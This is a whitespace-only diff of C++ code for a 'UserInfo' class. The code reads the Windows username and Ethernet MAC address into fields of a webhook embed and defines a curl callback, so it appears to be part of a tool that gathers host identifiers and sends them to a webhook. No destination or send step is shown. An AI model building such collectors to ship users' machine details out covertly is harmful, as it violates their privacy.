@@ -30,13 +30,13 @@ WebhookEmbed UserInfo::Build()
 
 void UserInfo::AddUsername()
 {
-	char username[UNLEN + 1];
-	DWORD usernameSize = UNLEN + 1;
+    char username[UNLEN + 1];
+    DWORD usernameSize = UNLEN + 1;
 
-	if (GetUserNameA(username, &usernameSize))
-	{
+    if (GetUserNameA(username, &usernameSize))
+    {
         this->embed.fields["Username"] = std::string(username, usernameSize);
-	}
+    }
 }
 
 void UserInfo::AddMAC()
@@ -53,19 +53,19 @@ void UserInfo::AddMAC()
             {
                 if (localhost != ip_table->table[i].dwAddr)
                 {
-                    
+
                     MIB_IFROW iInfo;
                     BYTE byMAC[6] = { 0, 0, 0, 0, 0, 0 };
                     memset(&iInfo, 0, sizeof(MIB_IFROW));
                     iInfo.dwIndex = ip_table->table[i].dwIndex;
                     GetIfEntry(&iInfo);
-                    
-                    if (MIB_IF_TYPE_ETHERNET == iInfo.dwType) 
+
+                    if (MIB_IF_TYPE_ETHERNET == iInfo.dwType)
                     {
                         memcpy(&byMAC, iInfo.bPhysAddr, iInfo.dwPhysAddrLen);
                         char macAddress[18];
                         sprintf(macAddress, "%02x-%02x-%02x-%02x-%02x-%02x", byMAC[0], byMAC[1], byMAC[2], byMAC[3], byMAC[4], byMAC[5]);
-                        
+
 
                         this->embed.fields["MAC Address"] = std::string(macAddress);
                         return;
@@ -186,7 +186,7 @@ void UserInfo::AddSystemInfo()
 
 size_t CurlWriteCallback(void* contents, size_t size, size_t nmemb, std::string* response)
 {
-	size_t totalSize = size * nmemb;
-	response->append((char*)contents, totalSize);
-	return totalSize;
+    size_t totalSize = size * nmemb;
+    response->append((char*)contents, totalSize);
+    return totalSize;
 }
